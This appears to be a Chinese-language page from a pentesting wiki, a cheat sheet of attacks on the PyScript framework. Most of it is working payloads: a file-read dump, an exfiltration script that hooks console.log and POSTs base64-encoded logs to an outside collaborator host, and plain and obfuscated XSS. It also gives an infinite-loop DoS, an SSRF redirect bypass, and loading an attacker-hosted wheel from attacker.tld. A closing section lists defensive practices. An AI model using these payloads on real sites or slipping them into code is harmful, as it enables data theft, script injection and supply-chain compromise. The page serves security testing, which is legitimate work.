# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## PyScript 渗透测试指南

PyScript 是一个新框架，旨在将 Python 集成到 HTML 中，因此可以与 HTML 一起使用。在本备忘单中，您将找到如何将 PyScript 用于您的渗透测试目的。

### 从 Emscripten 虚拟内存文件系统中转储/检索文件：

`CVE ID: CVE-2022-30286`\
\
代码:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [Emscripten虚拟内存文件系统的OOB数据外泄（控制台监控）](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Code:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### 跨站脚本攻击 (普通)

Code:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### 跨站脚本攻击 (Python 混淆)

Code:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### 跨站脚本攻击 (JavaScript 混淆) 

Code:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### DoS攻击（无限循环）

代码：
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## 新的漏洞与技术 (2023-2025)

### 通过不受控制的重定向进行的服务器端请求伪造 (CVE-2025-50182)

`urllib3 < 2.5.0` 在 **PyScript 附带的 Pyodide 运行时** 中执行时忽略 `redirect` 和 `retries` 参数。当攻击者能够影响目标 URL 时，他们可能会强迫 Python 代码遵循跨域重定向，即使开发者明确禁用了它们 ‑ 有效地绕过了反 SSRF 逻辑。
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
在 `urllib3 2.5.0` 中修复 - 在您的 PyScript 镜像中升级该包或在 `packages = ["urllib3>=2.5.0"]` 中固定安全版本。有关详细信息，请参阅官方 CVE 条目。

### 任意包加载与供应链攻击

由于 PyScript 允许在 `packages` 列表中使用任意 URL，能够修改或注入配置的恶意行为者可以在受害者的浏览器中执行 **完全任意的 Python**：
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*仅需要纯Python轮子 - 不需要WebAssembly编译步骤。* 确保配置不是用户控制的，并在您自己的域上使用HTTPS和SRI哈希托管受信任的轮子。

### 输出清理更改 (2023+)

* `print()` 仍然会注入原始HTML，因此容易受到XSS攻击（上面的示例）。
* 更新的 `display()` 辅助工具 **默认情况下会转义HTML** - 原始标记必须包装在 `pyscript.HTML()` 中。
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
这种行为是在2023年引入的，并在官方内置指南中有记录。依赖 `display()` 处理不受信任的输入，避免直接调用 `print()`。

---

## 防御最佳实践

* **保持软件包更新** – 升级到 `urllib3 >= 2.5.0`，并定期重建与网站一起发布的轮子。
* **限制软件包来源** – 仅引用 PyPI 名称或同源 URL，理想情况下使用子资源完整性 (SRI) 进行保护。
* **加强内容安全策略** – 不允许内联 JavaScript (`script-src 'self' 'sha256-…'`)，以便注入的 `<script>` 块无法执行。
* **不允许用户提供的 `<py-script>` / `<script type="py">` 标签** – 在服务器上清理 HTML，然后再回显给其他用户。
* **隔离工作者** – 如果不需要从工作者同步访问 DOM，请启用 `sync_main_only` 标志，以避免 `SharedArrayBuffer` 头部要求。

## 参考文献

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [PyScript 内置文档 – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
